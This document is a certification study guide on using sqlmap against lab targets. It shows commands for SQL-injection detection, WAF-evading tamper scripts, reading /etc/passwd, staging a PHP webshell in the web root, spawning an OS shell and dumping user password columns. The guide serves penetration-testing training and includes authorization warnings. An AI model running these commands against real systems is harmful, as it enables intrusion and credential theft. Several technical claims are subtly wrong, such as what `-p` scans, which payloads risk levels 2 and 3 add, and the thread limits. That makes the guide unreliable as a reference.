# sqlmap Basics

> eWPT · Tools — INE-Cybersecurity-Certifications-Guide

## Purpose

**sqlmap** is an open-source tool that automates the detection and exploitation
of **SQL injection** flaws. Once you have manually confirmed that a parameter
looks injectable, sqlmap can fingerprint the database, enumerate schemas,
extract tables and rows, and — when privileges allow — read files or spawn an
operating-system shell.

Two rules frame everything in this guide:

1. sqlmap is a **confirmation and extraction** tool, not a discovery oracle.
   Understand the request manually first; let sqlmap take over for the heavy
   lifting.
2. Run it **only against authorized targets**. Its more powerful options
   (`--os-shell`, `--dump-all`) are intrusive and generate real database
   load.

Install on Kali/Debian/Ubuntu:

```bash
sudo apt update && sudo apt install -y sqlmap
# or from source (latest features)
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap && python sqlmap.py --version
```

## 1. Basic detection

Point sqlmap at a URL that contains a parameter. Use `--batch` to accept
default answers to prompts (non-interactive), and use `--flush-session`
rarely — by default sqlmap caches results per target in its output folder.

```bash
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=abc123; security=low" --batch
```

What happens under the hood:

- sqlmap tests the parameter for **boolean-based blind**, **error-based**,
  **union-based**, **time-based blind**, and **stacked-query** injection.
- It fingerprints the **DBMS** (MySQL, PostgreSQL, MSSQL, Oracle, SQLite…)
  and the exact version when possible.
- Findings are saved under
  `~/.local/share/sqlmap/output/<host>/` as log and data files.

If nothing is found, the parameter may be filtered, WAF-protected, or simply
not injectable — move on rather than forcing flags.

## 2. Specifying parameters

sqlmap does not always guess where the injectable input lives.

- Pick the parameter with `-p` when you know which one is interesting
  (others are still scanned unless `--skip` is used):

```bash
sqlmap -u "http://target/app?id=1&lang=en" -p id --batch
```

- Send POST bodies with `--data`:

```bash
sqlmap -u "http://target/login" --data="user=admin&pass=x" -p pass --batch
```

- Authenticate properly with cookies or headers. Extracting a session from
  Burp Suite and reusing it keeps the test realistic:

```bash
sqlmap -u "http://target/app?id=1" \
       --cookie="session=eyJhbGciOi..." \
       --headers="X-Forwarded-For: 127.0.0.1" --batch
```

- Force the method (`--method POST`) or use a full request file captured in
  Burp: right-click the request → **Copy to file**, then `-r request.txt`.
  This preserves headers, cookies, and body exactly.

```bash
sqlmap -r request.txt -p id --batch
```

## 3. Levels and risks

Two flags widen what sqlmap tests; increase them deliberately, not by habit.

- `--level` (1–5): how many **payloads and injection contexts** are tried.
  Levels 2–3 add cookies and headers as injection points; levels 4–5 add many
  more payload variants. Each step multiplies request count.
- `--risk` (1–3): how **destructive** the payloads are. Risk 2 adds
  `OR 1=1`-style payloads that can modify data; risk 3 adds time-based and
  `OR` payloads with heavier side effects.

Start at the defaults (`--level=1 --risk=1`). If a parameter is confirmed
injectable but extraction fails, escalate one notch at a time:

```bash
sqlmap -u "http://target/app?id=1" --level=3 --risk=2 --batch
```

A clean **manual proof** of injection (a Repeater request that visibly changes
the response or delays it) should come *before* you let sqlmap escalate.

## 4. Tamper scripts

Tamper scripts mutate payloads to bypass **input filters or WAFs** — e.g.,
replacing spaces, encoding keywords, or obfuscating case. List them with:

```bash
sqlmap --list-tampers | less
```

Common families and when they matter:

- **Whitespace tricks** (`space2comment`, `space2plus`, `space2dash`) — when
  the filter rejects literal spaces.
- **Encoding tricks** (`charencode`, `charunencode`, `base64encode`) — when
  the filter decodes only once or blocks keywords.
- **Case and keyword tricks** (`randomcase`, `modsecurityversioned`) — against
  naive keyword blacklists.
- **Comment and version tricks** (`between`, `greatest`, `versionedmorecomments`)
  — replacing blocked syntax with equivalent constructs.

Use them only when a filter actually blocks the default payload; each tamper
adds requests and obscures your payloads:

```bash
sqlmap -u "http://target/app?id=1" --tamper=space2comment --batch
```

## 5. Reading files and OS shell

These features need a **file-privileged DBMS account** (e.g., MySQL `FILE`
privilege) or **stacked-query support**. They are loud and dangerous: use them
on labs, not on targets you merely have permission to *test*.

- Read a file the DB server can read (Linux: `/etc/passwd`):

```bash
sqlmap -u "http://target/app?id=1" --file-read=/etc/passwd --batch
```

- Write a file to the web root (classic webshell staging; only on your own
  lab machines):

```bash
sqlmap -u "http://target/app?id=1" \
       --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php --batch
```

- Attempt an interactive OS shell (`--os-shell`) or a single command
  (`--os-cmd`). sqlmap uploads a small stager and executes commands as the
  DBMS process user:

```bash
sqlmap -u "http://target/app?id=1" --os-shell --batch
```

## 6. Dump workflow

The standard enumeration path — enumerate, narrow down, dump, and repeat for
the interesting rows only:

```bash
# 1. List databases
sqlmap -u "http://target/app?id=1" --dbs --batch

# 2. List tables in one database
sqlmap -u "http://target/app?id=1" -D dvwa --tables --batch

# 3. List columns of one table
sqlmap -u "http://target/app?id=1" -D dvwa -T users --columns --batch

# 4. Dump the table (all rows) or a few columns / conditioned rows
sqlmap -u "http://target/app?id=1" -D dvwa -T users --dump --batch
sqlmap -u "http://target/app?id=1" -D dvwa -T users \
       -C user,password --start=1 --stop=5 --batch
```

Tips:

- Add `--threads 3` (max sensible value) to speed up blind extraction; it
  never reaches 10 in practice.
- Add `--time-sec=3` only when time-based payloads need a longer delay to be
  reliable.
- Extracted data and the session log live in
  `~/.local/share/sqlmap/output/<host>/`; back up the folder before big runs
  if you need the evidence later.

## Safe usage warnings

- **Authorization first.** sqlmap writes files, executes commands, and can
  modify rows when risk is raised. Verify scope before every run.
- **Prefer read-only.** Use default risk; reserve `--risk=2/3` and
  `--os-*` for your own lab machines.
- **Mind the load.** Each level/risk step can multiply requests by an order of
  magnitude. Add `--delay=1` against production-adjacent systems and never run
  multiple instances against one host.
- **Watch out for WAF lockouts and log noise.** Time-based payloads and file
  writes are conspicuous; keep them inside labs.
- **`--flush-session` when the request changes.** If you edit the request (new
  cookie, different parameter), stale cached results can mask a re-test. When
  in doubt, point sqlmap at a fresh output folder with `--output-dir`.

## Common Mistakes & Tips

- **Skipping manual confirmation** → sqlmap runs blind and you learn nothing.
  Prove the injection in Repeater first; sqlmap then confirms and extracts.
- **Forgetting the session cookie** → sqlmap tests an unauthenticated request
  and finds nothing. Reuse the authenticated request with `-r` or `--cookie`.
- **Wrong parameter with `-p`** → you scan a non-injectable field while the
  real sink sits elsewhere. Re-read the HTTP history before choosing.
- **Instant `--level=5 --risk=3`** → minutes of requests, WAF alarms, no extra
  signal. Escalate one notch at a time.
- **Expecting `--os-shell` everywhere** → it needs stacked queries plus file
  privileges; most targets will not offer it. `--dump` is the reliable win.
- Tip: run sqlmap against the *same* request you validated manually; copying
  from Burp (`-r`) removes a whole class of "works in browser, fails in
  sqlmap" mismatches.
- Tip: use `--string`/`--code` hints when the default truth criteria misfire
  on a page that never fully changes (customize what "true" looks like).

## Checklist / Self-Test

- [ ] I can explain what `--level` and `--risk` change and their defaults.
- [ ] I detected injection on a local lab parameter with `-u` + `--batch`.
- [ ] I re-ran the test from a Burp-captured request file with `-r`.
- [ ] I enumerated databases, tables, and columns before dumping.
- [ ] I dumped a specific table and located the extracted files on disk.
- [ ] I used one tamper script and described why it was needed.
- [ ] I know why `--os-shell` failed (or succeeded) on my lab target.
- [ ] I listed at least two safety controls I apply before every run.

---

## Further Resources

- sqlmap official site — <https://sqlmap.org/>
- sqlmap user's manual (wiki) — <https://github.com/sqlmapproject/sqlmap/wiki>
- PortSwigger Web Security Academy — SQL injection learning materials — <https://portswigger.net/web-security/sql-injection>
- OWASP SQL Injection — <https://owasp.org/www-community/attacks/SQL_Injection>
